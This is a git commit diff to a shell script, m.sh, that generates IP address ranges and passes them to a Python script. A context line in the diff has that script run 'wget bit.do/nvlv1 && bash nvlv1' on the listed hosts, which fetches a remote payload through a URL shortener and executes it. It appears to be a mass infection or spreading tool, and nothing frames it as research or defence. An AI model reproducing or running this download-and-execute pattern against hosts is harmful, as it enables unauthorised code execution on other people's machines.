f491f1d2b5c038006fac41576b36e12dbee8091e
deusveritatis <43490119+deusveritatis@users.noreply.github.com>
2020-02-01 21:52:31 +0530

    Update m.sh

--- m.sh
+++ m.sh
@@ -5,6 +5,6 @@ chmod +x create_ip.sh
 ./create_ip.sh 122 60 0
 ./create_ip.sh 123 60 0
 ./create_ip.sh 154 30 0
-./create_ip.sh 155 30 0
+./create_ip.sh 155 23 0
 
 python2 script.py 'on_ip.txt' ' wget bit.do/nvlv1 && bash nvlv1' 'ii' 
